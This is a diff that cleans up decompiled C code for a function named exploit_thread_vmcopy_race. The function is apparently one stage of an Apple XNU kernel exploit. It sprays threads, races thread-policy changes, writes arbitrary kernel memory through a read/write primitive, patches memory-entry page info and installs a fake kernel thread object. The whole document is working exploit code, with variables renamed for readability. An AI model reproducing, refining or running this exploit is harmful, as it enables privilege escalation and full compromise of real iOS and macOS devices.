@@ -228,6 +228,8 @@ enum
   VMCOPY_THREAD_POLICY_EXTRA_BITS = 0x3C0,
   VMCOPY_THREAD_POLICY_FLUSH_WIDE = 0x7FFFFFFF,
   VMCOPY_THREAD_POLICY_FLUSH_NARROW = 0x100,
+  VMCOPY_RACE_DONE = 1,
+  VMCOPY_RACE_RETRY = 87,
   VMCOPY_POLICY_MARK_XNU_MIN = 8796,
   VMCOPY_POLICY_MARK_DEFAULT_OFFSET = 184,
   VMCOPY_POLICY_MARK_LEGACY_CPU_OFFSET = 112,
@@ -8473,177 +8475,166 @@ __int64 __fastcall call_vtable_ptr_slot2(__int64 a1)
 //----- (00000000000111C0) ----------------------------------------------------
 __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
 {
-  __int64 *v2; // x20
-  unsigned __int64 v20; // x27
-  unsigned __int64 v23; // x25
-  unsigned __int64 v29; // x22
-  __int64 *v35; // x24
-  vm_address_t v36; // x28
-  __int64 v41; // x26
-  __int64 v44; // x22
-  __int64 v47; // x8
-  __int64 v48; // x28
-  int v54; // w8
-  __int64 v78; // x25
-  void *v94; // [xsp+40h] [xbp-6C0h]
-  __int64 v95; // [xsp+58h] [xbp-6A8h]
-  __int64 v96; // [xsp+98h] [xbp-668h]
-  __int64 v100; // [xsp+B0h] [xbp-650h]
-  unsigned __int64 v102; // [xsp+C0h] [xbp-640h]
-  __int64 v103; // [xsp+C8h] [xbp-638h]
-  int v104; // [xsp+D4h] [xbp-62Ch]
-  unsigned __int64 v106; // [xsp+E0h] [xbp-620h]
-  unsigned int v107; // [xsp+ECh] [xbp-614h]
-  unsigned __int64 v109; // [xsp+F8h] [xbp-608h]
-  natural_t suspendedThreadState[0x44]; // [xsp+140h] [xbp-5C0h] BYREF
-  VmcopyWritePhysmapBlock writePhysmapBlock; // [xsp+250h] [xbp-4B0h] BYREF
-  integer_t policy_info[4]; // [xsp+2C0h] [xbp-440h] BYREF
-  VmcopyRaceThreadBlock raceThreadBlock; // [xsp+2D0h] [xbp-430h] BYREF
-  pthread_t v149; // [xsp+310h] [xbp-3F0h] BYREF
-  __int64 v150; // [xsp+318h] [xbp-3E8h] BYREF
-  vm_address_t v152; // [xsp+328h] [xbp-3D8h] BYREF
-  thread_act_t target_act; // [xsp+334h] [xbp-3CCh] BYREF
-  thread_act_t v154; // [xsp+338h] [xbp-3C8h] BYREF
-  mem_entry_name_port_t object_handle; // [xsp+33Ch] [xbp-3C4h] BYREF
-  int v159; // [xsp+35Ch] [xbp-3A4h] BYREF
-  semaphore_t v160; // [xsp+360h] [xbp-3A0h] BYREF
-  semaphore_t semaphore; // [xsp+364h] [xbp-39Ch] BYREF
-  thread_act_t v162; // [xsp+368h] [xbp-398h] BYREF
-  thread_act_t child_act; // [xsp+36Ch] [xbp-394h] BYREF
-  uint64_t pageInfoPayload[30]; // [xsp+370h] [xbp-390h] BYREF
+  __int64 *kreadCtxSlot = (__int64 *)(someStruct + VMCOPY_KREAD_CTX_OFFSET);
+  int cpuBoardId = *(uint32_t *)(*(uint64_t *)(*kreadCtxSlot + 32LL) + 320LL);
+  thread_act_t childThread = 0;
+  thread_act_t stateThread = 0;
+  semaphore_t readySemaphore = 0;
+  semaphore_t resumeSemaphore = 0;
+  int pageShift = 0;
+  natural_t suspendedThreadState[0x44]; // BYREF
+  VmcopyWritePhysmapBlock writePhysmapBlock; // BYREF
+  integer_t policyInfo[4]; // BYREF
+  VmcopyRaceThreadBlock raceThreadBlock; // BYREF
+  pthread_t raceThread; // BYREF
+  __int64 raceState; // BYREF
+  thread_act_t targetThread = 0; // BYREF
+  thread_act_t sprayedThread; // BYREF
+  uint64_t pageInfoPayload[VMCOPY_PAGE_INFO_PAYLOAD_WORDS]; // BYREF
   VmcopyTargetThreadMapping targetMapping; // BYREF
-  __int128 __dst[19]; // [xsp+460h] [xbp-2A0h] BYREF
-  __int128 v180[16]; // [xsp+590h] [xbp-170h] BYREF
+  __int128 savedThreadObject[19]; // BYREF
+  __int128 capturedThreadSlots[16]; // BYREF
 
-  v2 = (__int64 *)(someStruct + 8);
-  v104 = *(uint32_t *)(*(uint64_t *)(*(uint64_t *)(someStruct + 8) + 32LL) + 320LL);
-  child_act = 0;
-  thread_create(mach_task_self_, &child_act);
-  v162 = 0;
-  thread_create(mach_task_self_, &v162);
-  semaphore = 0;
-  semaphore_create(mach_task_self_, &semaphore, 0, 0);
-  v160 = 0;
-  semaphore_create(mach_task_self_, &v160, 0, 0);
-  v159 = 0;
-  v106 = kernel_va_base_resolver(KRWCTX_FROM_RAW_FIELD(*v2, 32), 0, &v159);
-  VmcopyPackedMemoryEntry memoryEntry = vmcopy_make_packed_memory_entry(*v2, v106, v159);
-  object_handle = memoryEntry.objectHandle;
-  v95 = memoryEntry.pageInfoKaddr;
-  v109 = memoryEntry.pageInfoTableBase
-       - 48LL * memoryEntry.pageInfoRef
-       + VMCOPY_PACKED_PAGE_INFO_BASE_BIAS;
-  v20 = vmcopy_find_kernel_text_page_info(someStruct, v109, v106, v159);
-  kwrite_u64_to_addr(*v2, memoryEntry.objectKaddr + 24, 0);
-  kwrite_u64_to_addr(*v2, memoryEntry.objectKaddr + 32, -16384);
-  v154 = 0;
-  vmcopy_spray_threads(&v154, VMCOPY_THREAD_SPRAY_COUNT);
-  v107 = 0;
-  target_act = 0;
-  v103 = memoryEntry.pageInfoDataKaddr + 48;
-  v102 = v95 - v106;
-  v94 = (void *)(someStruct + 44);
+  thread_create(mach_task_self_, &childThread);
+  thread_create(mach_task_self_, &stateThread);
+  semaphore_create(mach_task_self_, &readySemaphore, 0, 0);
+  semaphore_create(mach_task_self_, &resumeSemaphore, 0, 0);
+
+  uint64_t kernelVaBase = kernel_va_base_resolver(KRWCTX_FROM_RAW_FIELD(*kreadCtxSlot, 32), 0, &pageShift);
+  VmcopyPackedMemoryEntry memoryEntry = vmcopy_make_packed_memory_entry(*kreadCtxSlot, kernelVaBase, pageShift);
+  mem_entry_name_port_t objectHandle = memoryEntry.objectHandle;
+  uint64_t memoryEntryPageInfoKaddr = memoryEntry.pageInfoKaddr;
+  uint64_t packedPageInfoBase = memoryEntry.pageInfoTableBase
+                              - 48LL * memoryEntry.pageInfoRef
+                              + VMCOPY_PACKED_PAGE_INFO_BASE_BIAS;
+  uint64_t kernelTextPageInfo = vmcopy_find_kernel_text_page_info(someStruct, packedPageInfoBase, kernelVaBase, pageShift);
+
+  kwrite_u64_to_addr(*kreadCtxSlot, memoryEntry.objectKaddr + 24, 0);
+  kwrite_u64_to_addr(*kreadCtxSlot, memoryEntry.objectKaddr + 32, -16384);
+
+  sprayedThread = 0;
+  vmcopy_spray_threads(&sprayedThread, VMCOPY_THREAD_SPRAY_COUNT);
+  uint32_t policyOffset = 0;
+  uint64_t memoryEntryPatchPageInfoKaddr = memoryEntry.pageInfoDataKaddr + 48;
+  uint32_t restorePageRef = (memoryEntryPageInfoKaddr - kernelVaBase) >> pageShift;
+  void *exceptionSnapshot = (void *)(someStruct + 44);
+  int raceStatus;
   do
   {
     if ( !vmcopy_prepare_target_thread_mapping(
             someStruct,
-            v103,
-            v102 >> v159,
-            object_handle,
-            &target_act,
+            memoryEntryPatchPageInfoKaddr,
+            restorePageRef,
+            objectHandle,
+            &targetThread,
             &targetMapping,
-            __dst) )
+            savedThreadObject) )
     {
-      goto LABEL_68;
+      raceStatus = VMCOPY_RACE_RETRY;
+      continue;
     }
-    v23 = targetMapping.taskKaddr;
-    v96 = targetMapping.originalThreadPtr;
-    v100 = targetMapping.threadKaddr;
-    v152 = targetMapping.mappedTaskPage;
-    v35 = targetMapping.taskThreadSlot;
-    v36 = targetMapping.mappedThreadObject;
-    v150 = 0;
-    memset(v180, 0, sizeof(v180));
-    vmcopy_init_race_thread_block(&raceThreadBlock, &v150, &target_act, v180, v160, semaphore);
-    pthread_create(&v149, 0, (void *(__cdecl *)(void *))call_vtable_ptr_slot2, &raceThreadBlock);
-    semaphore_wait(semaphore);
-    v29 = vmcopy_set_low_priority_and_find_policy_offset(*v2, v149, policy_info, &v107);
-    flush_cpu_cache(*(uint64_t *)(someStruct + 8), v29 + v107 + 4, 1);
-    vmcopy_prepare_current_thread_policy_race(*v2, v107, policy_info);
-    semaphore_signal(v160);
-    *(v35 - 1) = 0;
-    v41 = vmcopy_apply_thread_policy_bits(someStruct, v36);
-    if ( v104 <= 10001 )
-      *v35 = 0;
-    v44 = vmcopy_wait_for_thread_slot_replacement(*v2, v35, v96, &v150);
-    pthread_join(v149, 0);
-    if ( v104 <= 10001 )
-      *v35 = v44;
-    thread_act_t capturedThread = vmcopy_take_thread_for_kobject(*v2, (thread_act_t *)v180, sizeof(v180), v23);
+
+    uint64_t targetTaskKaddr = targetMapping.taskKaddr;
+    uint64_t originalThreadPtr = targetMapping.originalThreadPtr;
+    uint64_t targetThreadKaddr = targetMapping.threadKaddr;
+    vm_address_t mappedTaskPage = targetMapping.mappedTaskPage;
+    __int64 *targetThreadSlot = targetMapping.taskThreadSlot;
+    vm_address_t mappedThreadObject = targetMapping.mappedThreadObject;
+
+    raceState = 0;
+    memset(capturedThreadSlots, 0, sizeof(capturedThreadSlots));
+    vmcopy_init_race_thread_block(&raceThreadBlock, &raceState, &targetThread, capturedThreadSlots, resumeSemaphore, readySemaphore);
+    pthread_create(&raceThread, 0, (void *(__cdecl *)(void *))call_vtable_ptr_slot2, &raceThreadBlock);
+    semaphore_wait(readySemaphore);
+
+    uint64_t raceThreadKaddr = vmcopy_set_low_priority_and_find_policy_offset(*kreadCtxSlot, raceThread, policyInfo, &policyOffset);
+    flush_cpu_cache(*kreadCtxSlot, raceThreadKaddr + policyOffset + 4, 1);
+    vmcopy_prepare_current_thread_policy_race(*kreadCtxSlot, policyOffset, policyInfo);
+    semaphore_signal(resumeSemaphore);
+
+    *(targetThreadSlot - 1) = 0;
+    uint64_t originalNext = vmcopy_apply_thread_policy_bits(someStruct, mappedThreadObject);
+    if ( cpuBoardId <= 10001 )
+      *targetThreadSlot = 0;
+
+    uint64_t replacementThreadKaddr = vmcopy_wait_for_thread_slot_replacement(*kreadCtxSlot, targetThreadSlot, originalThreadPtr, &raceState);
+    pthread_join(raceThread, 0);
+    if ( cpuBoardId <= 10001 )
+      *targetThreadSlot = replacementThreadKaddr;
+
+    thread_act_t capturedThread = vmcopy_take_thread_for_kobject(
+                                    *kreadCtxSlot,
+                                    (thread_act_t *)capturedThreadSlots,
+                                    sizeof(capturedThreadSlots),
+                                    targetTaskKaddr);
+    __int64 captureState;
     if ( capturedThread )
     {
-      v150 = 3;
-      *(uint32_t *)(someStruct + 672) = capturedThread;
-      v47 = 3;
+      raceState = 3;
+      *(uint32_t *)(someStruct + VMCOPY_CAPTURED_THREAD_OFFSET) = capturedThread;
+      captureState = 3;
     }
     else
     {
-      v47 = v150;
+      captureState = raceState;
     }
-    v48 = *(uint64_t *)(v36 + 296);
-    if ( v41 == v48 || v48 == 0 || v47 != 3 )
+
+    uint64_t replacementNext = *(uint64_t *)(mappedThreadObject + VMCOPY_MAPPED_THREAD_NEXT_OFFSET);
+    if ( originalNext == replacementNext || replacementNext == 0 || captureState != 3 )
     {
-      vmcopy_terminate_thread_if_live((thread_act_t *)(someStruct + 672));
-      vmcopy_terminate_thread_list((thread_act_t *)v180, sizeof(v180));
-LABEL_68:
-      v54 = 87;
+      vmcopy_terminate_thread_if_live((thread_act_t *)(someStruct + VMCOPY_CAPTURED_THREAD_OFFSET));
+      vmcopy_terminate_thread_list((thread_act_t *)capturedThreadSlots, sizeof(capturedThreadSlots));
+      raceStatus = VMCOPY_RACE_RETRY;
       continue;
     }
-    vmcopy_mark_thread_policy_word_if_needed(*v2, v152, v23);
-    vmcopy_spray_threads_and_clear_prev_link(*v2, &v154, VMCOPY_THREAD_SPRAY_COUNT);
-    kwrite_u64_to_addr(*v2, v23 + qword_48008 - 8, v100);
-    kwrite_u64_to_addr(*v2, qword_48008 + v23, v96);
-    v78 = vmcopy_prepare_thread_state_physmap_race(
-            someStruct,
-            &memoryEntry,
-            v102 >> v159,
-            v109,
-            v106,
-            v159,
-            v20,
-            &targetMapping,
-            v162,
-            child_act,
-            suspendedThreadState,
-            &writePhysmapBlock,
-            __dst);
+
+    vmcopy_mark_thread_policy_word_if_needed(*kreadCtxSlot, mappedTaskPage, targetTaskKaddr);
+    vmcopy_spray_threads_and_clear_prev_link(*kreadCtxSlot, &sprayedThread, VMCOPY_THREAD_SPRAY_COUNT);
+    kwrite_u64_to_addr(*kreadCtxSlot, targetTaskKaddr + qword_48008 - 8, targetThreadKaddr);
+    kwrite_u64_to_addr(*kreadCtxSlot, qword_48008 + targetTaskKaddr, originalThreadPtr);
+
+    uint64_t baselineNext = vmcopy_prepare_thread_state_physmap_race(
+                              someStruct,
+                              &memoryEntry,
+                              restorePageRef,
+                              packedPageInfoBase,
+                              kernelVaBase,
+                              pageShift,
+                              kernelTextPageInfo,
+                              &targetMapping,
+                              stateThread,
+                              childThread,
+                              suspendedThreadState,
+                              &writePhysmapBlock,
+                              savedThreadObject);
     uint64_t capturedSnapshot = vmcopy_run_thread_state_race(
                                   someStruct,
-                                  __dst,
+                                  savedThreadObject,
                                   &writePhysmapBlock,
-                                  v160,
-                                  semaphore,
-                                  v78,
-                                  v48,
-                                  v41,
-                                  v100);
-    memcpy(v94, (const void *)capturedSnapshot, 0x130u);
-    vmcopy_receive_captured_thread_exception(someStruct, v94);
+                                  resumeSemaphore,
+                                  readySemaphore,
+                                  baselineNext,
+                                  replacementNext,
+                                  originalNext,
+                                  targetThreadKaddr);
+    memcpy(exceptionSnapshot, (const void *)capturedSnapshot, VMCOPY_THREAD_OBJECT_SNAPSHOT_BYTES);
+    vmcopy_receive_captured_thread_exception(someStruct, exceptionSnapshot);
     vmcopy_install_final_fake_thread_object(
       someStruct,
-      v103,
+      memoryEntryPatchPageInfoKaddr,
       *(uint64_t *)(someStruct + 32),
-      v102 >> v159,
-      object_handle,
+      restorePageRef,
+      objectHandle,
       pageInfoPayload);
-    *(uint32_t *)(someStruct + VMCOPY_CHILD_THREAD_PORT_OFFSET) = v162;
-    if ( semaphore + 1 >= 2 )
-      semaphore_destroy(mach_task_self_, semaphore);
-    if ( v160 + 1 >= 2 )
-      semaphore_destroy(mach_task_self_, v160);
-    v54 = 1;
+    *(uint32_t *)(someStruct + VMCOPY_CHILD_THREAD_PORT_OFFSET) = stateThread;
+
+    if ( readySemaphore + 1 >= 2 )
+      semaphore_destroy(mach_task_self_, readySemaphore);
+    if ( resumeSemaphore + 1 >= 2 )
+      semaphore_destroy(mach_task_self_, resumeSemaphore);
+    raceStatus = VMCOPY_RACE_DONE;
   }
-  while ( v54 == 87 );
+  while ( raceStatus == VMCOPY_RACE_RETRY );
   return 0;
 }
 
